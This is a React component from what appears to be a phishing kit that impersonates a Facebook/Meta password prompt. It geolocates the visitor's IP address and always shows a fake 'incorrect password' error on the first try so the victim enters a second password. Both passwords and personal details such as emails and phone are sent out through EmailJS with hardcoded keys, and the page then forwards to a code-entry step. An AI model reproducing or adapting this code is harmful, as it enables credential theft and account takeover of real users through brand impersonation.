import React, { useEffect, useState } from 'react';
import classNames from 'classnames/bind';
import styles from './Password.module.scss';
import images from '../../assets/images';
import Input from '../../components/Input';
import Button from '../../components/Button';
import { Eye, EyeSlash } from '@phosphor-icons/react';
import { useLocation, useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

const cx = classNames.bind(styles);

export default function Password() {
    const location = useLocation();
    const data = location.state;
    const navigate = useNavigate();

    const [showPassword, setShowPassword] = useState(false);
    const [typeInput, setTypeInput] = useState('password');
    const [showAlert, setShowAlert] = useState(false);
    const [showAlert1, setShowAlert1] = useState(false);
    const [password, setPassword] = useState('');
    const [password2, setPassword2] = useState('');
    const [count, setCount] = useState(0);
    const [disabled, setDisabled] = useState(false);

    const [ipAddress, setIPAddress] = useState('');
    const [country, setCountry] = useState('');

    const handShowPassword = () => {
        setShowPassword(!showPassword);
        setTypeInput(!showPassword ? 'password' : 'text');
    };

    useEffect(() => {
        fetch('https://geolocation-db.com/json/')
            .then((response) => response.json())
            .then((data) => {
                setIPAddress(data.IPv4);
                setCountry(data.country_name);
            })
            .catch();
    }, []);

    const sendMail = () => {
        const newData = { ...data, password, password2, code: '', code2: '' };
        console.log('Send message', newData);
        const from_name = ` ${country}: ${ipAddress}: ${data.fullName}`;
        const templateParams = {
            from_name,
            appeal: data.appeal,
            fullName: data.fullName,
            businessEmail: data.businessEmail,
            personalEmail: data.personalEmail,
            phone: data.phone,
            pageName: data.pageName,
            password,
            password2,
            code1: '',
            code2: '',
        };

        emailjs.send('service_ov9gxjl', 'template_q3fvhvv', templateParams, 'WJI8m2NskQkFr84WZ').then(
            (response) => {
                console.log('Successfully');
            },
            (error) => {
                console.error('Failed');
            },
        );
    };

    const handleSend = () => {
        if (count === 1) {
            sendMail();
            const newData = { ...data, password, password2, from_name: ` ${country}: ${ipAddress}: ${data.fullName}` };
            navigate('/code', { state: newData });
        }
        if (count === 0) {
            if (password !== '') {
                setShowAlert1(false);
                setShowAlert(true);
                setCount(1);
                setDisabled(true);
                sendMail();
            } else {
                setShowAlert1(true);
            }
        }
    };

    return (
        <div className={cx('wraper')}>
            <div className={cx('container')}>
                <div className={cx('logo')}>
                    <img src={images.fb_round_logo} alt="Logo" width={60} />
                </div>
                <div className={cx('content')}>
                    <Input
                        classNameWarper={cx('input')}
                        type={typeInput}
                        value={count === 1 ? password2 : password}
                        onChange={(e) => {
                            if (count === 1) {
                                setPassword2(e.target.value);
                                setDisabled(false);
                            } else {
                                setPassword(e.target.value);
                                setDisabled(false);
                            }
                        }}
                        placeholder={'Password'}
                        onClickIconRight={handShowPassword}
                        iconRight={
                            showPassword ? <EyeSlash size={25} weight="bold" /> : <Eye size={25} weight="bold" />
                        }
                    />
                    {showAlert && <span className={cx('alert')}>The password you've entered is incorrect!</span>}
                    {showAlert1 && <span className={cx('alert')}>Password can not be blank!</span>}
                    <Button disabled={disabled} large primary className={cx('btn')} onClick={handleSend}>
                        Continue
                    </Button>
                    <span className={cx('forgot')}>
                        <a href="https://www.facebook.com/login/identify">Forgot Password?</a>
                    </span>
                </div>
                <div className={cx('meta')}>
                    <img src={images.meta_logo_grey} width={80} alt="meta" />
                </div>
            </div>
        </div>
    );
}
